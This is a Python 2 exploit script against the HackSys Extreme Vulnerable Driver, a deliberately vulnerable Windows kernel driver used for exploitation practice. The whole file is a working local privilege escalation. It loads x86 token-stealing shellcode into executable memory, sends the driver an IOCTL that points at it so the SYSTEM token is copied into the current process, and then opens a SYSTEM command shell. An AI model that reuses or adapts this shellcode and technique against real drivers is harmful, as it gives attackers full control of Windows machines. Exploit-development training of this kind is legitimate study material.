import os
import sys
import struct
from ctypes import *
from ctypes.wintypes import *
from subprocess import *

kernel32  = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

		
		
def main():
    lpBytesReturned = c_ulong()
    
    #(GENERIC_READ | GENERIC_WRITE) = 0XC0000000
    hDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)
    
    if not hDevice or hDevice == -1:
        print "[!] Error to get handle to the driver " + str(ctypes.GetLastError())
        return -1
    print "[+] Input that passed to Kernel Drivers"
    shellcode = bytearray (
        "\x90\x90\x90\x90"              # NOP Sled
        "\x60"                          # pushad
        "\x64\xA1\x24\x01\x00\x00"      # mov eax, fs:[KTHREAD_OFFSET]
        "\x8B\x40\x50"                  # mov eax, [eax + EPROCESS_OFFSET]
        "\x89\xC1"                      # mov ecx, eax (Current _EPROCESS structure)
        "\x8B\x98\xF8\x00\x00\x00"      # mov ebx, [eax + TOKEN_OFFSET]
        "\xBA\x04\x00\x00\x00"          # mov edx, 4 (SYSTEM PID)
        "\x8B\x80\xB8\x00\x00\x00"      # mov eax, [eax + FLINK_OFFSET]
        "\x2D\xB8\x00\x00\x00"          # sub eax, FLINK_OFFSET
        "\x39\x90\xB4\x00\x00\x00"      # cmp [eax + PID_OFFSET], edx
        "\x75\xED"                      # jnz
        "\x8B\x90\xF8\x00\x00\x00"      # mov edx, [eax + TOKEN_OFFSET]
        "\x89\x91\xF8\x00\x00\x00"      # mov [ecx + TOKEN_OFFSET], edx
        "\x61"                          # popad
        "\xC3"                          # ret
    )
    
    ptr = kernel32.VirtualAlloc(c_int(0),c_int(len(shellcode)),c_int(0x3000),c_int(0x40))
    buff = (c_char * len(shellcode)).from_buffer(shellcode)
    kernel32.RtlMoveMemory(c_int(ptr),buff,c_int(len(shellcode)))
    ShellcodePtr = id(shellcode) + 20
    print "[+] Shellcode Pointer Address: 0x%X" % ShellcodePtr
    shellcode_final = struct.pack("<L",ptr)
    
    buf = "\x41\x41\x41\x41" + shellcode_final
    bufSize  = len(buf)
    bufPtr = id(buf) + 20
    print "[+] Buffer Pointer Address: 0x%X " % bufPtr
    kernel32.DeviceIoControl(hDevice, 0x222023, bufPtr, bufSize, None, 0,byref(lpBytesReturned), None)
    print "[+] Privilege Windows Command Shell"
    Popen("start cmd", shell=True)
         
if __name__ == '__main__':
	main()